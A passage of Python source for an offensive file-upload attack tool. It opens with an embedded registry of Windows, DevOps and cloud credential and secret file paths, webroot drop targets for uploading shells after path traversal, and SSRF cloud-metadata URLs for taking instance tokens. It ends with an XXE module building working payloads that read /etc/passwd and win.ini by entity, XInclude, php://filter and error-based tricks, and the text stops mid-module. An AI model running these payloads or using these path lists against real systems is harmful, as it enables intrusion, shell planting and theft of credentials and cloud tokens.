      "/etc/apache2/sites-available/default-ssl.conf",
      "/etc/apache2/mods-enabled/",
      "/etc/httpd/conf/httpd.conf",
      "/etc/httpd/conf.d/ssl.conf",
      "/etc/nginx/nginx.conf",
      "/etc/nginx/sites-enabled/default",
      "/etc/nginx/conf.d/default.conf",
      "/etc/proftpd/proftpd.conf",
      "/etc/vsftpd.conf",
      "/etc/pure-ftpd/pure-ftpd.conf",
      "/etc/samba/smb.conf",
      "/etc/squid/squid.conf",
      "/etc/openvpn/server.conf",
      "/etc/openvpn/client.conf",
      "/etc/wireguard/wg0.conf",
      "/etc/strongswan/ipsec.conf",
      "/etc/strongswan/ipsec.secrets",
      "/etc/freeradius/3.0/clients.conf"
    ]
  },

  "windows": {
    "system_info": [
      "C:/Windows/win.ini",
      "C:/Windows/system.ini",
      "C:/Windows/System32/drivers/etc/hosts",
      "C:/Windows/System32/drivers/etc/networks",
      "C:/Windows/System32/drivers/etc/services",
      "C:/Windows/System32/drivers/etc/protocol",
      "C:/Windows/System32/drivers/etc/lmhosts.sam",
      "C:/Windows/php.ini",
      "C:/Windows/my.ini",
      "C:/Windows/php/php.ini",
      "C:/boot.ini",
      "C:/autoexec.bat",
      "C:/Windows/setupact.log",
      "C:/Windows/setuperr.log"
    ],

    "registry_hives": [
      "C:/Windows/System32/config/SAM",
      "C:/Windows/System32/config/SYSTEM",
      "C:/Windows/System32/config/SECURITY",
      "C:/Windows/System32/config/SOFTWARE",
      "C:/Windows/System32/config/DEFAULT",
      "C:/Windows/System32/config/RegBack/SAM",
      "C:/Windows/System32/config/RegBack/SYSTEM",
      "C:/Windows/System32/config/RegBack/SECURITY",
      "C:/Windows/System32/config/RegBack/SOFTWARE",
      "C:/Windows/repair/sam",
      "C:/Windows/repair/system",
      "C:/Windows/repair/security",
      "C:/Windows/repair/software"
    ],

    "credentials": [
      "C:/unattend.xml",
      "C:/unattended.xml",
      "C:/Windows/Panther/Unattend.xml",
      "C:/Windows/Panther/Unattend/Unattended.xml",
      "C:/Windows/Panther/Unattended.xml",
      "C:/Windows/Panther/UnattendGC/setupact.log",
      "C:/Windows/System32/sysprep/sysprep.xml",
      "C:/Windows/System32/sysprep/sysprep.inf",
      "C:/sysprep.inf",
      "C:/sysprep.xml",
      "C:/Windows/debug/NetSetup.LOG",
      "C:/Windows/System32/config/SecEvent.Evt",
      "C:/ProgramData/Microsoft/Group Policy/History/",
      "C:/Users/{USER}/.ssh/id_rsa",
      "C:/Users/{USER}/.ssh/id_ed25519",
      "C:/Users/{USER}/.ssh/authorized_keys",
      "C:/Users/{USER}/.ssh/config",
      "C:/Users/Administrator/.ssh/id_rsa",
      "C:/ProgramData/ssh/sshd_config"
    ],

    "shell_history": [
      "C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
      "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
      "C:/Users/{USER}/AppData/Local/Microsoft/Windows/History/History.IE5/",
      "C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/Recent/"
    ],

    "logs": [
      "C:/inetpub/logs/LogFiles/W3SVC1/u_ex{YYMMDD}.log",
      "C:/Windows/System32/LogFiles/W3SVC1/u_ex{YYMMDD}.log",
      "C:/Windows/System32/LogFiles/HTTPERR/httperr1.log",
      "C:/Windows/System32/winevt/Logs/Security.evtx",
      "C:/Windows/System32/winevt/Logs/System.evtx",
      "C:/Windows/System32/winevt/Logs/Application.evtx",
      "C:/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx",
      "C:/xampp/apache/logs/access.log",
      "C:/xampp/apache/logs/error.log",
      "C:/xampp/mysql/data/{HOSTNAME}.err",
      "C:/wamp/logs/access.log",
      "C:/wamp/logs/apache_error.log",
      "C:/wamp/logs/mysql.log",
      "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/logs/catalina.{YYMMDD}.log",
      "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/logs/localhost.{YYMMDD}.log",
      "C:/Program Files/MySQL/MySQL Server {VERSION}/data/{HOSTNAME}.err"
    ],

    "iis": [
      "C:/inetpub/wwwroot/web.config",
      "C:/inetpub/wwwroot/{APP}/web.config",
      "C:/Windows/System32/inetsrv/config/applicationHost.config",
      "C:/Windows/System32/inetsrv/config/administration.config",
      "C:/Windows/System32/inetsrv/config/redirection.config",
      "C:/Windows/System32/inetsrv/MetaBase.xml",
      "C:/inetpub/temp/IIS Temporary Compressed Files/",
      "C:/inetpub/history/"
    ],

    "third_party_creds": [
      "C:/Users/{USER}/AppData/Roaming/WinSCP.ini",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/sitemanager.xml",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/recentservers.xml",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/filezilla.xml",
      "C:/ProgramData/Microsoft/Crypto/RSA/MachineKeys/",
      "C:/Program Files/PuTTY/sessions/",
      "C:/ProgramData/PuTTY/sessions/",
      "C:/Users/{USER}/.aws/credentials",
      "C:/Users/{USER}/.aws/config",
      "C:/Users/{USER}/.kube/config",
      "C:/Users/{USER}/.docker/config.json",
      "C:/Users/{USER}/AppData/Roaming/gcloud/credentials.db",
      "C:/Users/{USER}/AppData/Roaming/gcloud/application_default_credentials.json",
      "C:/Users/{USER}/.azure/accessTokens.json",
      "C:/Users/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/AppData/Roaming/Mozilla/Firefox/Profiles/",
      "C:/Users/{USER}/AppData/Local/Google/Chrome/User Data/Default/Login Data",
      "C:/Users/{USER}/AppData/Local/Microsoft/Edge/User Data/Default/Login Data"
    ]
  },

  "webroots": {
    "$note": "Per-language drop targets for shell uploads after a successful path-traversal escape. The traversal payload becomes: ../../../{webroot}/{stem}.{ext}. Languages here mirror UpMap's MODULE_LANG and UpGen's ALL_LANGS.",

    "php": {
      "linux": [
        "/var/www/html/",
        "/var/www/",
        "/var/www/public/",
        "/usr/share/nginx/html/",
        "/etc/nginx/html/",
        "/srv/www/htdocs/",
        "/srv/http/",
        "/srv/www/",
        "/opt/lampp/htdocs/",
        "/opt/bitnami/apache2/htdocs/",
        "/home/{USER}/public_html/",
        "/home/{USER}/www/",
        "/var/www/vhosts/{DOMAIN}/httpdocs/",
        "/var/www/{DOMAIN}/public_html/"
      ],
      "windows": [
        "C:/xampp/htdocs/",
        "C:/wamp/www/",
        "C:/wamp64/www/",
        "C:/Apache24/htdocs/",
        "C:/Program Files/Apache Group/Apache2/htdocs/",
        "C:/Program Files (x86)/Apache Group/Apache2/htdocs/",
        "C:/inetpub/wwwroot/"
      ]
    },

    "asp": {
      "$note": "Classic ASP — Windows / IIS only.",
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/inetpub/wwwroot/{APP}/",
        "C:/inetpub/vhosts/{DOMAIN}/httpdocs/"
      ]
    },

    "aspx": {
      "$note": "ASP.NET — Windows / IIS only.",
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/inetpub/wwwroot/{APP}/",
        "C:/inetpub/wwwroot/{APP}/bin/",
        "C:/inetpub/wwwroot/{APP}/App_Code/",
        "C:/inetpub/vhosts/{DOMAIN}/httpdocs/"
      ]
    },

    "jsp": {
      "linux": [
        "/opt/tomcat/webapps/ROOT/",
        "/opt/tomcat/webapps/{APP}/",
        "/usr/local/tomcat/webapps/ROOT/",
        "/usr/share/tomcat9/webapps/ROOT/",
        "/var/lib/tomcat/webapps/ROOT/",
        "/var/lib/tomcat9/webapps/ROOT/",
        "/var/lib/tomcat10/webapps/ROOT/",
        "/opt/jetty/webapps/ROOT/",
        "/usr/share/jetty9/webapps/ROOT/",
        "/opt/wildfly/standalone/deployments/",
        "/opt/jboss/standalone/deployments/"
      ],
      "windows": [
        "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/webapps/ROOT/",
        "C:/Tomcat/webapps/ROOT/",
        "C:/Tomcat{TOMCAT_VER}/webapps/ROOT/",
        "C:/Program Files/Jetty/webapps/ROOT/"
      ]
    },

    "coldfusion": {
      "linux": [
        "/opt/coldfusion{VERSION}/wwwroot/",
        "/opt/coldfusion/wwwroot/",
        "/opt/lucee/tomcat/webapps/ROOT/"
      ],
      "windows": [
        "C:/ColdFusion{VERSION}/wwwroot/",
        "C:/ColdFusion/wwwroot/",
        "C:/JRun4/servers/lib/wwwroot/",
        "C:/lucee/tomcat/webapps/ROOT/"
      ]
    },

    "perl_cgi": {
      "$note": "Generic CGI dir — Perl, Python, Ruby, Bash CGI scripts execute when dropped here.",
      "linux": [
        "/usr/lib/cgi-bin/",
        "/var/www/cgi-bin/",
        "/var/www/html/cgi-bin/",
        "/usr/local/apache2/cgi-bin/",
        "/srv/www/cgi-bin/",
        "/home/{USER}/cgi-bin/"
      ],
      "windows": [
        "C:/Apache24/cgi-bin/",
        "C:/xampp/cgi-bin/",
        "C:/wamp/cgi-bin/"
      ]
    },

    "static": {
      "$note": "Plain document roots — useful for dropping HTML/JS (XSS landing pages) or static config files.",
      "linux": [
        "/var/www/html/",
        "/usr/share/nginx/html/",
        "/srv/http/"
      ],
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/xampp/htdocs/"
      ]
    }
  },

  "devops_cloud": {
    "docker": [
      "/var/run/docker.sock",
      "/.dockerenv",
      "/etc/docker/daemon.json",
      "/etc/docker/key.json",
      "/var/lib/docker/containers/",
      "/var/lib/docker/image/",
      "/var/lib/docker/volumes/",
      "/root/.docker/config.json",
      "/home/{USER}/.docker/config.json",
      "C:/ProgramData/Docker/config/daemon.json",
      "C:/Users/{USER}/.docker/config.json"
    ],

    "kubernetes": [
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
      "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
      "/etc/kubernetes/admin.conf",
      "/etc/kubernetes/kubelet.conf",
      "/etc/kubernetes/scheduler.conf",
      "/etc/kubernetes/controller-manager.conf",
      "/etc/kubernetes/pki/ca.crt",
      "/etc/kubernetes/pki/ca.key",
      "/etc/kubernetes/pki/apiserver.crt",
      "/etc/kubernetes/pki/apiserver.key",
      "/etc/kubernetes/pki/apiserver-kubelet-client.key",
      "/etc/kubernetes/pki/etcd/ca.crt",
      "/etc/kubernetes/pki/etcd/server.key",
      "/etc/kubernetes/manifests/",
      "/var/lib/kubelet/config.yaml",
      "/var/lib/kubelet/kubeadm-flags.env",
      "/var/lib/kubelet/pki/kubelet-client-current.pem",
      "/root/.kube/config",
      "/home/{USER}/.kube/config",
      "C:/Users/{USER}/.kube/config"
    ],

    "aws": [
      "/root/.aws/credentials",
      "/root/.aws/config",
      "/home/{USER}/.aws/credentials",
      "/home/{USER}/.aws/config",
      "/home/{USER}/.aws/cli/cache/",
      "/etc/aws/credentials",
      "C:/Users/{USER}/.aws/credentials",
      "C:/Users/{USER}/.aws/config"
    ],

    "gcp": [
      "/root/.config/gcloud/credentials.db",
      "/root/.config/gcloud/access_tokens.db",
      "/root/.config/gcloud/application_default_credentials.json",
      "/root/.config/gcloud/active_config",
      "/root/.config/gcloud/configurations/config_default",
      "/root/.config/gcloud/legacy_credentials/",
      "/home/{USER}/.config/gcloud/credentials.db",
      "/home/{USER}/.config/gcloud/application_default_credentials.json",
      "C:/Users/{USER}/AppData/Roaming/gcloud/credentials.db",
      "C:/Users/{USER}/AppData/Roaming/gcloud/application_default_credentials.json"
    ],

    "azure": [
      "/root/.azure/accessTokens.json",
      "/root/.azure/azureProfile.json",
      "/root/.azure/clouds.config",
      "/root/.azure/msal_token_cache.json",
      "/root/.azure/service_principal_entries.json",
      "/home/{USER}/.azure/accessTokens.json",
      "/home/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/.azure/accessTokens.json",
      "C:/Users/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/.azure/msal_token_cache.json"
    ],

    "cicd": [
      "/var/lib/jenkins/secrets/master.key",
      "/var/lib/jenkins/secrets/hudson.util.Secret",
      "/var/lib/jenkins/secrets/initialAdminPassword",
      "/var/lib/jenkins/credentials.xml",
      "/var/lib/jenkins/jobs/",
      "/var/lib/jenkins/users/",
      "/var/lib/jenkins/config.xml",
      "/home/jenkins/.ssh/id_rsa",
      "/home/jenkins/workspace/",
      "/home/gitlab-runner/.gitlab-runner/config.toml",
      "/etc/gitlab-runner/config.toml",
      "/var/opt/gitlab/gitlab-rails/etc/secrets.yml",
      "/var/opt/gitlab/postgresql/data/pg_hba.conf",
      "C:/ProgramData/GitLab-Runner/config.toml",
      "C:/Program Files/Jenkins/secrets/master.key",
      "./.github/workflows/",
      "./.gitlab-ci.yml",
      "./Jenkinsfile",
      "./.circleci/config.yml",
      "./.drone.yml",
      "./bitbucket-pipelines.yml",
      "./azure-pipelines.yml",
      "./.travis.yml",
      "./buildspec.yml",
      "./cloudbuild.yaml"
    ],

    "scm": [
      "/.git/config",
      "/.git/HEAD",
      "/.git/credentials",
      "/.git/logs/HEAD",
      "/.git/index",
      "/.git/packed-refs",
      "/.git/info/exclude",
      "/.gitconfig",
      "/root/.gitconfig",
      "/root/.git-credentials",
      "/home/{USER}/.gitconfig",
      "/home/{USER}/.git-credentials",
      "/.svn/entries",
      "/.svn/wc.db",
      "/.svn/all-wcprops",
      "/.hg/store/",
      "/.hg/hgrc",
      "/.bzr/branch/branch.conf",
      "/CVS/Root",
      "/CVS/Entries"
    ],

    "iac": [
      "./terraform.tfstate",
      "./terraform.tfstate.backup",
      "./.terraform/terraform.tfstate",
      "./.terraform.lock.hcl",
      "./terraform.tfvars",
      "./secrets.auto.tfvars",
      "./packer.json",
      "/etc/ansible/hosts",
      "/etc/ansible/ansible.cfg",
      "/home/{USER}/.ansible/cp/",
      "/home/{USER}/.ansible.cfg",
      "./ansible.cfg",
      "./inventory",
      "/etc/salt/master",
      "/etc/salt/minion",
      "/etc/salt/pki/master/master.pem",
      "/etc/salt/pki/minion/minion.pem",
      "/etc/chef/client.rb",
      "/etc/chef/client.pem",
      "/etc/chef/validation.pem",
      "/etc/puppet/puppet.conf",
      "/etc/puppetlabs/puppet/ssl/private_keys/",
      "/etc/cfengine/ppkeys/localhost.priv"
    ],

    "secrets_managers": [
      "/var/lib/vault/",
      "/etc/vault.d/vault.hcl",
      "/etc/vault.d/agent.hcl",
      "/opt/vault/data/",
      "/opt/consul/data/",
      "/etc/consul.d/",
      "/etc/consul/server.json",
      "/var/lib/etcd/",
      "/etc/etcd/etcd.conf",
      "/etc/etcd/ssl/etcd-server.pem"
    ],

    "containers_runtime": [
      "/proc/1/cgroup",
      "/sys/fs/cgroup/",
      "/run/containerd/containerd.sock",
      "/var/run/containerd/containerd.sock",
      "/run/crio/crio.sock",
      "/var/run/crio/crio.sock",
      "/etc/containerd/config.toml",
      "/etc/crio/crio.conf"
    ],

    "env_files": [
      "./.env",
      "./.env.local",
      "./.env.production",
      "./.env.development",
      "./.env.staging",
      "./.env.test",
      "/etc/environment",
      "/etc/default/locale",
      "./config.yaml",
      "./config.yml",
      "./settings.yaml",
      "./application.properties",
      "./application.yml"
    ],

    "databases": [
      "/var/lib/mysql/mysql/user.MYD",
      "/var/lib/mysql/ibdata1",
      "/var/lib/mysql/mysql.sock",
      "/var/lib/postgresql/{VERSION}/main/base/",
      "/var/lib/postgresql/{VERSION}/main/postmaster.pid",
      "/var/lib/redis/dump.rdb",
      "/var/lib/mongodb/",
      "/var/lib/elasticsearch/",
      "/var/backups/dump.sql",
      "/tmp/dump.sql",
      "/tmp/backup.tar.gz"
    ]
  },

  "cloud_metadata_endpoints": {
    "$note": "FILE-BASED cloud instance-metadata artifacts written to disk at boot by cloud-init / waagent / GCE guest agent. LFI-safe: every leaf here is a real local file. URL counterparts live under .ssrf_targets (consumed by the SSRF module, not by --file-read).",

    "aws": [
      "/var/lib/cloud/data/instance-id",
      "/var/lib/cloud/data/previous-instance-id",
      "/var/lib/cloud/data/result.json",
      "/var/lib/cloud/data/status.json",
      "/var/lib/cloud/instance/user-data.txt",
      "/var/lib/cloud/instance/user-data.txt.i",
      "/var/lib/cloud/instance/obj.pkl",
      "/var/lib/cloud/instance/cloud-config.txt",
      "/var/lib/cloud/instance/scripts/runcmd",
      "/var/lib/cloud/instance/sem/config_scripts_user",
      "/var/lib/cloud/seed/nocloud-net/meta-data",
      "/var/lib/cloud/seed/nocloud-net/user-data",
      "/var/log/cloud-init.log",
      "/var/log/cloud-init-output.log",
      "/etc/ec2_version",
      "/etc/aws/credentials",
      "/run/cloud-init/instance-data.json",
      "/run/cloud-init/result.json",
      "/run/cloud-init/status.json"
    ],

    "gcp": [
      "/var/lib/google/instance_id",
      "/var/lib/google/oslogin.cache",
      "/var/lib/google-cloud-ops-agent/log/health-checks.log",
      "/etc/default/instance_configs.cfg",
      "/var/log/google_metadata_script_runner.log",
      "/var/log/google-startup-scripts.log",
      "/var/log/google-shutdown-scripts.log",
      "/var/lib/cloud/instance/scripts/runcmd",
      "/run/cloud-init/instance-data.json"
    ],

    "azure": [
      "/var/lib/waagent/ovf-env.xml",
      "/var/lib/waagent/CustomData",
      "/var/lib/waagent/Incarnation",
      "/var/lib/waagent/GoalState.1.xml",
      "/var/lib/waagent/HostingEnvironmentConfig.xml",
      "/var/lib/waagent/SharedConfig.xml",
      "/var/lib/waagent/Certificates.xml",
      "/var/lib/waagent/TransportPrivate.pem",
      "/var/lib/waagent/TransportCert.pem",
      "/var/log/waagent.log",
      "/var/log/azure/cluster-provision.log",
      "/var/log/azure/custom-script/handler.log",
      "/etc/waagent.conf",
      "C:/WindowsAzure/Logs/WaAppAgent.log",
      "C:/WindowsAzure/Config/",
      "C:/AzureData/CustomData.bin"
    ],

    "openstack": [
      "/var/lib/cloud/seed/config-drive/openstack/latest/meta_data.json",
      "/var/lib/cloud/seed/config-drive/openstack/latest/user_data",
      "/var/lib/cloud/seed/config-drive/openstack/latest/vendor_data.json",
      "/var/lib/cloud/seed/config-drive/openstack/latest/network_data.json",
      "/mnt/config/openstack/latest/meta_data.json",
      "/mnt/config/openstack/latest/user_data"
    ],

    "digitalocean": [
      "/var/lib/cloud/seed/nocloud-net/meta-data",
      "/var/lib/cloud/seed/nocloud-net/user-data",
      "/run/cloud-init/instance-data.json"
    ],

    "kubernetes_node": [
      "/etc/kubernetes/manifests/kube-apiserver.yaml",
      "/etc/kubernetes/manifests/kube-controller-manager.yaml",
      "/etc/kubernetes/manifests/kube-scheduler.yaml",
      "/etc/kubernetes/manifests/etcd.yaml",
      "/var/lib/kubelet/config.yaml",
      "/var/lib/kubelet/kubeadm-flags.env",
      "/var/lib/kubelet/pki/kubelet-client-current.pem",
      "/etc/cni/net.d/"
    ],

    "common_cloudinit": [
      "/etc/cloud/cloud.cfg",
      "/etc/cloud/cloud.cfg.d/",
      "/var/lib/cloud/instance/cloud-config.txt",
      "/var/lib/cloud/scripts/per-instance/",
      "/var/lib/cloud/scripts/per-boot/",
      "/var/lib/cloud/scripts/per-once/",
      "/var/lib/cloud/seed/",
      "/run/cloud-init/cloud-id",
      "/run/cloud-init/ds-identify.log",
      "/run/cloud-init/result.json",
      "/run/cloud-init/status.json",
      "/run/cloud-init/instance-data.json",
      "/run/cloud-init/instance-data-sensitive.json"
    ]
  },

  "ssrf_targets": {
    "$note": "HTTP/HTTPS cloud-metadata endpoints. NOT file paths — never routed through --file-read or path-traversal write payloads. Reserved for the SSRF module (ssrf_url) and any future SSRF-aware generator. Each provider sub-key is a flat URL list; provider-specific request-header requirements are documented in $headers.",
    "$headers": {
      "aws_imdsv2":  "PUT /latest/api/token with 'X-aws-ec2-metadata-token-ttl-seconds: 21600', then GET with 'X-aws-ec2-metadata-token: <token>'.",
      "gcp":         "All requests require 'Metadata-Flavor: Google'.",
      "azure":       "All requests require 'Metadata: true'."
    },

    "aws_imdsv1": [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/latest/meta-data/iam/info",
      "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
      "http://169.254.169.254/latest/meta-data/instance-id",
      "http://169.254.169.254/latest/meta-data/hostname",
      "http://169.254.169.254/latest/meta-data/local-ipv4",
      "http://169.254.169.254/latest/meta-data/public-ipv4",
      "http://169.254.169.254/latest/meta-data/mac",
      "http://169.254.169.254/latest/user-data/",
      "http://169.254.169.254/latest/dynamic/instance-identity/document",
      "http://169.254.169.254/latest/dynamic/instance-identity/signature"
    ],

    "aws_ecs_task_metadata": [
      "http://169.254.170.2/v2/credentials/",
      "http://169.254.170.2/v2/metadata"
    ],

    "aws_lambda": [
      "http://localhost:9001/2018-06-01/runtime/invocation/next"
    ],

    "gcp": [
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity",
      "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
      "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",
      "http://metadata.google.internal/computeMetadata/v1/project/project-id",
      "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
      "http://169.254.169.254/computeMetadata/v1/"
    ],

    "azure": [
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
    ],

    "alibaba": [
      "http://100.100.100.200/latest/meta-data/",
      "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
      "http://100.100.100.200/latest/user-data/"
    ],

    "digitalocean": [
      "http://169.254.169.254/metadata/v1/",
      "http://169.254.169.254/metadata/v1.json",
      "http://169.254.169.254/metadata/v1/user-data",
      "http://169.254.169.254/metadata/v1/hostname",
      "http://169.254.169.254/metadata/v1/region"
    ],

    "openstack": [
      "http://169.254.169.254/openstack/latest/",
      "http://169.254.169.254/openstack/latest/meta_data.json",
      "http://169.254.169.254/openstack/latest/user_data",
      "http://169.254.169.254/openstack/latest/password",
      "http://169.254.169.254/openstack/latest/vendor_data.json"
    ],

    "oracle_cloud": [
      "http://169.254.169.254/opc/v1/instance/",
      "http://169.254.169.254/opc/v1/instance/metadata/",
      "http://169.254.169.254/opc/v2/instance/"
    ],

    "ibm_cloud": [
      "http://169.254.169.254/instance_identity/v1/",
      "http://169.254.169.254/metadata/v1/"
    ],

    "packet_equinix": [
      "https://metadata.packet.net/metadata",
      "https://metadata.platformequinix.com/metadata"
    ],

    "kubernetes_node": [
      "http://169.254.169.254/latest/meta-data/",
      "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
    ]
  }
}
'''
EMBEDDED_PATHS = json.loads(_EMBEDDED_PATHS_JSON)

def _is_dir_path(p):
    """True when p looks like a *filesystem* directory marker — trailing '/'
    or '\\' AND not a URL. Used by the CLI layer to refuse literal
    --file-read on a dir, and by _resolve_paths_key to drop dir leaves from
    @key results without nuking trailing-slash URLs in @ssrf_targets."""
    if not isinstance(p, str) or len(p) <= 1:
        return False
    if p.startswith(("http://", "https://", "ftp://", "ftps://", "gopher://")):
        return False
    return p[-1] in ("/", "\\")


def _validate_file_read_or_die(fr, error_fn):
    """Reject a --file-read argument that points at a directory. Three cases:
      1. literal path (no '@'): must not end with '/' or '\\'
      2. @key resolves to nothing (key invalid or every leaf was a dir): reject
      3. @key resolves to a SINGLE dir leaf (user drilled too far into a dir):
         reject and ask them to pick a file inside
    Multi-leaf @key results are pre-filtered of dirs by _resolve_paths_key,
    so they never reach the dir checks here. error_fn(msg) must not return
    (typically argparse parser.error / sys.exit-style)."""
    if not fr:
        return
    if not fr.startswith("@"):
        if _is_dir_path(fr):
            error_fn(
                "--file-read %r is a directory path. Specify a file inside it "
                "(e.g. %sfoo.conf) — LFI payloads cannot 'read' a directory."
                % (fr, fr))
        return
    resolved = _resolve_paths_key(fr)
    if not resolved:
        error_fn(
            "--file-read %r did not resolve to any file leaves. Either the "
            "@key.path is unknown, or every entry under it was a directory "
            "(directories are filtered). Drill down to a more specific @key "
            "that yields a regular file." % fr)
    if len(resolved) == 1 and _is_dir_path(resolved[0]):
        error_fn(
            "--file-read %r resolves to a single directory leaf (%r). "
            "Pick a file path inside it instead of the directory itself."
            % (fr, resolved[0]))


def _resolve_paths_key(key, registry=None, allow_dirs=False):
    """Resolve '@category.sub[.leaf]' → list[str] of paths from the embedded
    registry (or supplied override). A literal (non-'@') key passes through
    as [key]. Returns None if the key cannot be resolved.

    Walks the tree collecting every string leaf; skips meta-keys starting
    with '$'. By default, directory-style leaves (trailing '/' or '\\')
    are silently dropped — '@linux' must resolve to readable FILES only.
    Pass allow_dirs=True for consumers that legitimately want directories
    (Upname's --webroot drop-target, where /var/www/html/ IS the answer).

    Single-leaf resolution (node is itself a string) is returned as-is so
    the CLI layer can reject a one-dir result with a clear error message."""
    if not isinstance(key, str) or not key.startswith("@"):
        return [key] if key else None
    reg = registry if registry is not None else EMBEDDED_PATHS
    parts = key[1:].split(".")
    node = reg
    for p in parts:
        if isinstance(node, dict) and p in node:
            node = node[p]
        else:
            return None
    if isinstance(node, str):
        return [node]
    leaves = []
    def _ok(s):
        return (isinstance(s, str)
                and not s.startswith("$")
                and (allow_dirs or not _is_dir_path(s)))
    def _walk(n):
        if isinstance(n, str):
            if _ok(n):
                leaves.append(n)
        elif isinstance(n, list):
            for x in n:
                if _ok(x):
                    leaves.append(x)
        elif isinstance(n, dict):
            for k, v in n.items():
                if k.startswith("$"):
                    continue
                _walk(v)
    _walk(node)
    return leaves or None
# ─── END EMBEDDED PATHS ──────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
# XXE
# ─────────────────────────────────────────────────────────────────────────────

@module("xxe_xml")
def mod_xxe_xml(ctx: UploadContext):
    """XXE via pure XML + Office documents (docx/xlsx).
    All 5 UploadScanner XXE techniques: Entity, ParameterEntity, XInclude, DTD, Schema.
    """
    info("xxe_xml — Entity + Param + XInclude + DTD + Schema in XML + Office docs")
    oast    = ctx.opts.oast or ""
    probe   = "UpMapXXEXML" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"

    # LFI targets routed through _lfi(): --file-read PATH overrides every one;
    # otherwise the per-payload default below is used.
    LF_PASSWD   = _lfi(ctx, "/etc/passwd")
    LF_WIN      = _lfi(ctx, "/c:/windows/win.ini")
    LF_HOSTNAME = _lfi(ctx, "/etc/hostname")
    LF_HOSTS    = _lfi(ctx, "/etc/hosts")
    xml_payloads = [
        # Entity — Linux
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_PASSWD}">]>\n'
        f'<root><data>&xxe;</data></root>'.encode(),
        # Entity — Windows
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_WIN}">]>\n'
        f'<root><data>&xxe;</data></root>'.encode(),
        # XInclude (no DOCTYPE — WAF bypass)
        f'<?xml version="1.0"?>\n'
        f'<root xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include href="file://{LF_PASSWD}" parse="text"/></root>'.encode(),
        # Entity — /etc/hostname (shorter than passwd; survives some passwd blocklists)
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_HOSTNAME}">]>\n'
        f'<root><data>&xxe;</data></root>'.encode(),
        # Entity — /etc/hosts (host/cluster mapping)
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{LF_HOSTS}">]>\n'
        f'<root><data>&xxe;</data></root>'.encode(),
        # php://filter base64 — encodes the file so ':'/'&'/'<' in the body can't
        # break the entity reference (PHP libxml targets). In-band reflection.
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        f'"php://filter/convert.base64-encode/resource={LF_PASSWD}">]>\n'
        f'<root><data>&xxe;</data></root>'.encode(),
        # php://filter rot13 — alternative encoding wrapper.
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        f'"php://filter/read=string.rot13/resource={LF_PASSWD}">]>\n'
        f'<root><data>&xxe;</data></root>'.encode(),
        # Standalone parameter-entity eval chain (ssrf_x.xml): %file; -> %eval; -> &xxe;
        # The core building block for blind/error-based XXE.
        f'<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
        f'  <!ENTITY % eval "<!ENTITY xxe \'%file;\'>">\n'
        f'  %eval;\n'
        f']>\n'
        f'<root><data>&xxe;</data></root>'.encode(),
        # Error-based XXE (no outbound): fold the file content into a bogus SYSTEM
        # path so the parser leaks it inside the error message it reflects back.
        f'<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
        f'  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
        f'\'file:///nonexistent/%file;\'>">\n'
        f'  %eval;\n'
        f'  %error;\n'
        f']>\n'
        f'<root>trigger</root>'.encode(),
    ]

    if oast:
        # DTD (Dtd technique from UploadScanner)
